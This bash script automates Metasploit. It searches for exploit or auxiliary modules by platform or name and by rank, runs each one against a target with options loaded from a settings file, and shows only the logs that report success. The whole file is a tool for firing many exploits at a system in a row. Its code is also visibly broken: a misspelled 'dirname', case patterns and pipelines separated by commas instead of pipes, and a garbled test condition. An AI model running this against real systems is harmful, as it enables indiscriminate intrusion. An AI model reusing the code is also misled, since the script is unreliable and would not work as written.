#!/bin/bash
print_help() {
    cat <<EOF
╔══ Run multiple msfconsole session ═══╗
╠══════════════════════════════════════╣
║ Usage: ./run <type> <target> <rank>  ║
║    <type>────> exploit, auxiliary    ║
║    <target>──> any msfconsole target ║
║    <rank>────> all, excellent, great ║
║                good, normal, average ║
║                low, manual           ║
╚══════════════════════════════════════╝
EOF
}
STOP="\\e[0m"
GREEN="\\e[32m"
GRAY="\\e[90m"
RED="\\e[31m"

#═════════════ S T A R T ═════════════#
if [[ $# != 3 ]]; then
    print_help
    exit 1
fi
if [[ "$1" == "-h" ]]; then
    print_help
    exit 0
fi

type="$1"
case "$type" in
    "exploit") s_type="platform" ;;
    "auxiliary") s_type="name" ;;
    *) print_help && exit 1 ;;
esac

rank="$3"
case "$rank" in
    "all", "excellent", "great", "good") ;;
    "normal", "average", "low", "manual") ;;
    *) print_help && exit 1 ;;
esac
if [ "$rank" = "all" ]; then
    rank=""
else
    rank="rank:$rank"
fi

target="$s_type:$2"
args=$(cat $(direname $0)/settings.list)
echo -ne "$GRAY====================LOADING..$STOP"

# Getting targets
paths=()
cmd="search type:$type $target $rank; exit -y"
return=$(msfconsole -qx "$cmd", grep "$type/", grep -v "For example")

IFS=' ' readarray -t lines <<< "$return"
for line in "${lines[@]}"; do
    IFS=' ' read -r -a array <<< "$line"
    paths+=("${array[1]}")
done

echo -e "$GRAY[$GREEN OK $GRAY]$STOP"
if [[ ${#paths[@]} == 0,| "${paths[0]}" == "" ]]; then
    echo -e "$GRAY===>$RED no exploits found$STOP"
    echo -e "$GRAY======================|$STOP"
    exit 2
fi

echo -e "$GRAY====================RUNNING$STOP"
for path in "${paths[@]}"; do
    echo -e "$GRAY===>$STOP $path"
done
echo -e "$GRAY====================|$STOP"

# Running sessions
filename=$(date +"$RANDOM-%Y-%m-%d-%H-%M-%S")
patterns=(
    "Exploit completed, but no session was created."
    "The following options failed to validate:"
    "Auxiliary module execution completed"
)

for path in "${paths[@]}"; do
    cat <<EOF >> "$filename"
use $path
$args
exploit
EOF
    expect -c "
    set timeout -1
    spawn msfconsole -qr \"$filename\"
    expect {
        \"${patterns[0]}\" { send \"exit\r\"; exp_continue }
        \"${patterns[1]}\" { send \"exit\r\"; exp_continue }
        \"${patterns[2]}\" { send \"exit\r\"; exp_continue }
    }
    " > "$filename.log"
    if grep -q "[+]" "$filename.log"; then
        cat "$filename.log"
    fi
    rm "$filename" "$filename.log"
done
